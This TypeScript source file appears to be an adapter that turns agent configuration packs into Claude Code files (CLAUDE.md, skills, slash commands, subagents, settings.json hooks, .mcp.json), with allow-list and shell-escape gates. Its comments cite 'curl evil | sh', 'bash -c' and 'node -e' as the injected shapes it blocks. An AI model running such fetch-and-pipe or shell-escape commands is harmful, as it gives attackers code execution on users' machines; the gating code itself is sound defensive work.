import { parse as parseYaml } from "yaml";
import type { AdapterExportOptions, AdapterOutputFile, Atom } from "../schema/types.js";
import {
  atomsByType,
  defineAdapter,
  demoteBodyHeadings,
  readAtomDirectory,
  readAtomFile,
  readPackRelativeFile,
  resolveSubagentBody,
  stableJsonStringify,
  wrapInstructionBlock,
  yamlFrontmatter,
} from "./types.js";
import { renderRuleMarkdown } from "./ruleContent.js";
import { isCredentialFreeHttpUrl, isShellEscape } from "./commandGate.js";
import {
  parseHookEvents,
  parseHookHandler,
  selectHookEventValue,
} from "./hookValidation.js";
import { invalidClaudeMcpFields } from "./mcpValidation.js";
import {
  conformSkillMd,
  normalizeSkillSlug,
  renderSkillMd,
} from "../skills/agentskills.js";

function slugFor(atom: Atom): string {
  // The atom-id regex guarantees a single `:`-separated slug component with
  // no path separators. Strip any defense-in-depth metacharacters anyway.
  const raw = atom.id.split(":")[1] ?? atom.name;
  return raw.replace(/[^a-zA-Z0-9._-]/g, "_");
}

function renderInstructionBody(atom: Atom, body: string | null): string {
  // Section header is `### ` (level 3). Strip a redundant leading H1 that
  // duplicates the atom name, and demote remaining headings so they nest
  // beneath the section header instead of emitting an <h1> under the <h3>
  // (issue #24).
  const text = demoteBodyHeadings((body ?? atom.description).trim(), 3, atom.name);
  return `### ${atom.name}\n\n_(${atom.id})_\n\n${text}\n`;
}

async function renderRuleSection(packRoot: string, atom: Atom): Promise<string> {
  const body = await renderRuleMarkdown(packRoot, atom);
  return `### Rule: ${atom.name}\n\n_(${atom.id})_\n\n${body}\n`;
}

interface ParsedYaml {
  [key: string]: unknown;
}

async function parseAtomYaml(packRoot: string, atom: Atom): Promise<ParsedYaml | null> {
  const raw = await readAtomFile(packRoot, atom);
  if (!raw) return null;
  try {
    const parsed = parseYaml(raw) as unknown;
    if (parsed && typeof parsed === "object" && !Array.isArray(parsed)) {
      return parsed as ParsedYaml;
    }
    return null;
  } catch {
    return null;
  }
}

/**
 * Allow-list check for hook command strings. A hook command may either:
 *  - Match exactly one of the pack-level `permissions.shell.commands`
 *    declarations (verbatim string match).
 *  - Be a single-token command (no spaces, no shell metacharacters), in
 *    which case it must still appear in the allow-list or we refuse.
 *
 * This prevents a malicious pack from injecting `curl evil | sh` into the
 * generated `.claude/settings.json` hooks block.
 */
function isHookCommandAllowed(command: string, allowed: string[]): boolean {
  if (!command) return false;
  // Reject shell/interpreter-escape shapes outright even if allow-listed —
  // matching `sh -c …` exactly is too easy to slip past review.
  if (isShellEscape(command, [])) {
    return false;
  }
  return allowed.includes(command);
}

/**
 * Sync S3 (#112): user-scope path mapping. The adapter emits the PROJECT
 * layout (`CLAUDE.md`, `.claude/…`, `.mcp.json`); a `--scope user` install
 * roots at `~/.claude`, whose layout drops the `.claude/` prefix
 * (`~/.claude/CLAUDE.md`, `~/.claude/skills/…`, `~/.claude/settings.json`).
 * `.mcp.json` keeps its name under `~/.claude` — Claude Code reads user-scope
 * MCP servers from `~/.claude.json`, which lives OUTSIDE the install root and
 * is never touched; the caller surfaces that ceiling as a warning.
 *
 * Content mapping: hook commands are emitted as
 * `$CLAUDE_PROJECT_DIR/.claude/hooks/<script>`, which at user scope would
 * resolve into whatever project the agent happens to be in — rewrite them to
 * `$HOME/.claude/hooks/<script>` (hooks run through a shell, so `$HOME`
 * expands).
 */
export function mapClaudeCodeOutputToUserScope(file: { path: string; content: string }): {
  path: string;
  content: string;
} {
  let p = file.path;
  if (p.startsWith(".claude/")) p = p.slice(".claude/".length);
  let content = file.content;
  if (p === "settings.json") {
    content = content.replace(/\$\{?CLAUDE_PROJECT_DIR\}?\/\.claude\//g, "$HOME/.claude/");
  }
  return { path: p, content };
}

export const claudeCodeAdapter = defineAdapter({
  target: "claude-code",
  async build(options: AdapterExportOptions) {
    const { manifest, packRoot, resolvedAtoms } = options;
    const files: AdapterOutputFile[] = [];
    const warnings: string[] = [];
    const unsupported: string[] = [];
    const byType = atomsByType(resolvedAtoms);

    const allowedShellCommands = manifest.permissions?.shell?.commands ?? [];

    // ---------- CLAUDE.md ----------
    const instructionAtoms = byType.get("instruction") ?? [];
    const ruleAtoms = byType.get("rule") ?? [];
    const workflowAtoms = byType.get("workflow") ?? [];

    const sections: string[] = [`# ${manifest.metadata.name}\n`];
    sections.push(
      `> ${manifest.metadata.description}\n\n` +
        `Publisher: \`${manifest.metadata.publisher}\` · Version: \`${manifest.metadata.version}\` · Profile: \`${options.profile}\`\n`,
    );

    if (instructionAtoms.length > 0) {
      sections.push("## Instructions\n");
      for (const atom of instructionAtoms) {
        const body = await readAtomFile(packRoot, atom);
        sections.push(renderInstructionBody(atom, body));
      }
    }
    if (ruleAtoms.length > 0) {
      sections.push("## Rules\n");
      for (const atom of ruleAtoms) {
        sections.push(await renderRuleSection(packRoot, atom));
      }
    }
    if (workflowAtoms.length > 0) {
      sections.push("## Workflows\n");
      for (const atom of workflowAtoms) {
        sections.push(`### ${atom.name}\n\n_(${atom.id})_\n\n${atom.description}\n`);
      }
    }

    files.push({
      path: "CLAUDE.md",
      content: wrapInstructionBlock(manifest.metadata.id, sections.join("\n")),
      action: "create",
    });

    // ---------- Skills ----------
    // Emitted skill folders conform to the Agent Skills spec (agentskills.io):
    // slug-normalized directory names, name = directory, YAML-safe frontmatter.
    const skillAtoms = byType.get("skill") ?? [];
    for (const atom of skillAtoms) {
      const slug = normalizeSkillSlug(slugFor(atom));
      const entries = await readAtomDirectory(packRoot, atom);
      if (entries.length === 0) {
        warnings.push(
          `Skill \`${atom.id}\` directory not found at \`${atom.path}\`; emitting minimal SKILL.md.`,
        );
        files.push({
          path: `.claude/skills/${slug}/SKILL.md`,
          content: renderSkillMd(
            { name: slug, description: atom.description },
            `# ${atom.name}\n\n${atom.description}`,
          ),
          action: "create",
        });
      } else {
        // `skill.md` (lowercase, spec-accepted) is conformed to canonical
        // SKILL.md only when no SKILL.md exists — emitting both to the same
        // path would trip applyInstall's create-only write.
        const hasCanonical = entries.some((e) => e.relPath === "SKILL.md");
        for (const entry of entries) {
          if (
            entry.relPath === "SKILL.md" ||
            (entry.relPath === "skill.md" && !hasCanonical)
          ) {
            const conformed = conformSkillMd(entry.content, slug, {
              name: slug,
              description: atom.description,
            });
            warnings.push(...conformed.warnings.map((w) => `Skill \`${atom.id}\`: ${w}`));
            files.push({
              path: `.claude/skills/${slug}/SKILL.md`,
              content: conformed.content,
              action: "create",
            });
          } else {
            files.push({
              path: `.claude/skills/${slug}/${entry.relPath}`,
              content: entry.content,
              action: "create",
            });
          }
        }
      }
    }

    // ---------- Commands (compile to .claude/commands/ slash commands) ----------
    // Claude Code registers user-invocable slash commands from
    // `.claude/commands/<name>.md` — a command compiled into `.claude/skills/`
    // would never be invocable as `/<name>`.
    const commandAtoms = byType.get("command") ?? [];
    for (const atom of commandAtoms) {
      const slug = slugFor(atom);
      const parsed = await parseAtomYaml(packRoot, atom);
      let body: string | null = null;
      const promptPath = parsed?.["prompt"];
      if (typeof promptPath === "string" && promptPath.length > 0) {
        body = await readPromptFile(packRoot, promptPath);
      }
      const args = parsed?.["arguments"] as
        Array<{ name?: string; default?: unknown }> | undefined;
      const argHint =
        args && args.length > 0
          ? args.map((a) => `[${a.name ?? "arg"}]`).join(" ")
          : undefined;
      files.push({
        path: `.claude/commands/${slug}.md`,
        content: `${yamlFrontmatter({ description: atom.description, "argument-hint": argHint })}\n${body ?? `# ${atom.name}\n\n${atom.description}`}\n`,
        action: "create",
      });
    }

    // ---------- Subagents ----------
    const subagentAtoms = byType.get("subagent") ?? [];
    for (const atom of subagentAtoms) {
      const slug = slugFor(atom);
      // Resolve the body from either a markdown agent (frontmatter + prompt) or
      // a YAML descriptor — so a manifest can reference an existing
      // `.claude/agents/*.md` in place without losing the system prompt.
      const { instructions, description, tools, model, verbatim } =
        await resolveSubagentBody(packRoot, atom);
      // Frontmatter carries only keys Claude Code's agent loader understands
      // (name, description, tools, model) — provenance and risk live in the
      // lockfile. Prefer values lifted from the source agent's frontmatter;
      // yamlFrontmatter omits undefined keys.
      // A markdown-sourced body is the agent's actual system prompt — emit it
      // verbatim (#102). Descriptor/fallback bodies get a synthesized title.
      const body = verbatim ? instructions : `# ${atom.name}\n\n${instructions}`;
      files.push({
        path: `.claude/agents/${slug}.md`,
        content: `${yamlFrontmatter({ name: slug, description: description ?? atom.description, tools, model })}\n${body}\n`,
        action: "create",
      });
    }

    // ---------- .claude/settings.json (hooks) ----------
    // Emitted entries carry ONLY the keys Claude Code's settings schema
    // accepts ({matcher, hooks: [{type, command}]}). Provenance (source atom,
    // risk) lives in the lockfile — extra keys here would trip the settings
    // validator.
    const hookAtoms = byType.get("hook") ?? [];
    if (hookAtoms.length > 0) {
      const hooks: Record<string, unknown[]> = Object.create(null) as Record<
        string,
        unknown[]
      >;
      for (const atom of hookAtoms) {
        const parsed = await parseAtomYaml(packRoot, atom);
        const lifecycleEvents = (atom as { lifecycle?: { events?: unknown } }).lifecycle
          ?.events;
        const parsedEvents = parsed?.["events"];
        const rawEvents = selectHookEventValue(
          lifecycleEvents,
          parsedEvents,
          "claude-code",
        );
        const events = parseHookEvents(rawEvents, ["PostToolUse"]);
        if (!events) {
          warnings.push(
            `Hook ${atom.id} has malformed or unsafe Claude Code lifecycle events. Refusing to emit it.`,
          );
          unsupported.push(atom.id);
          continue;
        }
        const rawHandler = parsed?.["handler"] ?? (atom as { handler?: unknown }).handler;
        const { handler, invalidFields } = parseHookHandler(rawHandler);
        if (!handler) {
          warnings.push(
            `Hook \`${atom.id}\` has a malformed hook handler (${invalidFields.join(", ")}). Refusing to emit it into settings.json.`,
          );
          unsupported.push(atom.id);
          continue;
        }
        const command = handler.command;
        if (!isHookCommandAllowed(command, allowedShellCommands)) {
          warnings.push(
            `Hook \`${atom.id}\` declares command \`${command || "(empty)"}\` which is NOT listed in \`permissions.shell.commands\`. Refusing to emit it into settings.json.`,
          );
          unsupported.push(atom.id);
          continue;
        }
        if (
          handler.commandWindows !== undefined &&
          !isHookCommandAllowed(handler.commandWindows, allowedShellCommands)
        ) {
          warnings.push(
            `Hook ${atom.id} declares Windows command ${handler.commandWindows}, which is not allow-listed or contains a shell escape. Refusing to emit it into settings.json.`,
          );
          unsupported.push(atom.id);
          continue;
        }
        // Bundled hook script (#90): write it to `.claude/hooks/<name>` so the
        // rewritten `$CLAUDE_PROJECT_DIR/.claude/hooks/<name>` command resolves.
        // The emitted file is path-contained + lockfile-hashed like any output.
        if (handler.script_path) {
          const scriptBody = await readPackRelativeFile(packRoot, handler.script_path);
          if (scriptBody == null) {
            warnings.push(
              `Hook \`${atom.id}\` references bundled script \`${handler.script_path}\`, which is missing or escapes the pack. Refusing to emit it.`,
            );
            unsupported.push(atom.id);
            continue;
          }
          const scriptName = handler.script_path.split("/").pop()!;
          files.push({
            path: `.claude/hooks/${scriptName}`,
            content: scriptBody,
            action: "create",
          });
        }
        for (const evt of events) {
          const list = hooks[evt] ?? [];
          const commandHook: Record<string, unknown> = { type: "command", command };
          for (const key of [
            "async",
            "timeout",
            "commandWindows",
            "statusMessage",
          ] as const) {
            if (handler[key] !== undefined) commandHook[key] = handler[key];
          }
          const entry: Record<string, unknown> = { hooks: [commandHook] };
          // Tool-event hooks need a tool matcher. A pack may pin its own via
          // handler.matcher; otherwise default to file-editing tools — a
          // bare "*" would fire the command after EVERY tool call (Read,
          // Grep, Bash, ...), which is never what an after-edit hook means.
          if (evt === "PreToolUse" || evt === "PostToolUse") {
            entry["matcher"] = handler.matcher ?? "Edit|Write";
          }
          list.push(entry);
          hooks[evt] = list;
        }
      }
      if (Object.keys(hooks).length > 0) {
        files.push({
          path: ".claude/settings.json",
          content: stableJsonStringify({ hooks }),
          action: "create",
        });
        warnings.push(
          "Hook atom(s) installed — they run shell commands after agent edits. Review before enabling.",
        );
      }
    }

    // ---------- .mcp.json (MCP servers) ----------
    // Claude Code reads project-scoped MCP servers from `.mcp.json` at the
    // project root — NOT from `.claude/settings.json`. Entries written there
    // are silently ignored. Schema per server: {type, command, args, env} for
    // stdio, {type, url} for http/sse. `${VAR}` env values are expanded by
    // Claude Code from the user's environment, so secrets never land on disk.
    const mcpAtoms = byType.get("mcp_server") ?? [];
    if (mcpAtoms.length > 0) {
      const mcpServers: Record<string, unknown> = {};
      const declaredServers = manifest.permissions?.mcp?.servers ?? [];
      for (const atom of mcpAtoms) {
        const slug = slugFor(atom);
        const descriptor = await parseAtomYaml(packRoot, atom);
        const a = { ...(descriptor ?? {}), ...atom } as {
          transport?: string;
          command?: string;
          args?: string[];
          env?: Record<string, unknown>;
          url?: string;
          cwd?: string;
          codex_only_config?: string[];
          [key: string]: unknown;
        };
        const invalidFields = invalidClaudeMcpFields(a);
        if (invalidFields.length > 0) {
          warnings.push(
            `MCP server ${atom.id} has malformed or Claude-incompatible fields: ${invalidFields.join(", ")}. Refusing to emit it into .mcp.json.`,
          );
          unsupported.push(atom.id);
          continue;
        }
        if ((a.codex_only_config?.length ?? 0) > 0) {
          warnings.push(
            `MCP server \`${atom.id}\` was not exported because Codex-only restrictions cannot be represented safely in Claude Code: ${a.codex_only_config!.join(", ")}.`,
          );
          unsupported.push(atom.id);
          continue;
        }
        // Gate symmetric to hooks: an MCP server's command is arbitrary
        // process execution at session start. Require the server to be
        // declared in `permissions.mcp.servers`, and refuse shell-escape
        // shapes outright (`bash -c`, `node -e`, ...) — otherwise an
        // mcp_server atom is a trivial bypass of the hook allow-list.
        const transport = a.transport ?? (a.url ? "http" : "stdio");
        const joined = [a.command ?? "", ...(a.args ?? [])].join(" ");
        if (!declaredServers.includes(slug)) {
          warnings.push(
            `MCP server \`${atom.id}\` is not declared in \`permissions.mcp.servers\`. Refusing to emit it into .mcp.json.`,
          );
          unsupported.push(atom.id);
          continue;
        }
        if (
          transport === "stdio" &&
          (!a.command || a.url || isShellEscape(a.command, a.args ?? []))
        ) {
          warnings.push(
            `MCP server \`${atom.id}\` command \`${joined || "(empty)"}\` contains a shell-escape shape. Refusing to emit it into .mcp.json.`,
          );
          unsupported.push(atom.id);
          continue;
        }
        if (transport === "stdio") {
          mcpServers[slug] = {
            type: "stdio",
            command: a.command,
            args: a.args ?? [],
            env: Object.fromEntries(
              Object.entries(a.env ?? {}).map(([k]) => [k, `\${${k}}`]),
            ),
          };
        } else if (
          (transport === "http" || transport === "sse") &&
          isCredentialFreeHttpUrl(a.url) &&
          !a.command &&
          (a.args?.length ?? 0) === 0 &&
          Object.keys(a.env ?? {}).length === 0 &&
          !a.cwd
        ) {
          mcpServers[slug] = { type: transport, url: a.url };
        } else {
          warnings.push(
            `MCP server ${atom.id} has an unsupported transport or unsafe remote URL. Refusing to emit it into .mcp.json.`,
          );
          unsupported.push(atom.id);
          continue;
        }
        warnings.push(
          `MCP server \`${atom.id}\` configured in .mcp.json. Required env: ${Object.keys(a.env ?? {}).join(", ") || "(none)"}.`,
        );
      }
      if (Object.keys(mcpServers).length > 0) {
        files.push({
          path: ".mcp.json",
          content: stableJsonStringify({ mcpServers }),
          action: "create",
        });
      }
    }

    const supportedTypes = new Set([
      "instruction",
      "rule",
      "workflow",
      "skill",
      "command",
      "subagent",
      "hook",
      "mcp_server",
    ]);
    for (const r of resolvedAtoms) {
      if (!supportedTypes.has(r.atom.type)) {
        unsupported.push(r.atom.id);
        warnings.push(
          `Atom \`${r.atom.id}\` of type \`${r.atom.type}\` has no Claude Code adapter mapping; emitted as note only.`,
        );
      }
    }

    return { files, warnings, unsupportedAtoms: unsupported };
  },
});

async function readPromptFile(packRoot: string, relPath: string): Promise<string | null> {
  // The prompt path is a manifest-controlled string referenced from an atom
  // body (yaml `prompt:` field). Same trust boundary as atom.path — including
  // symlink rejection — owned by the shared helper (CWE-59).
  return readPackRelativeFile(packRoot, relPath);
}
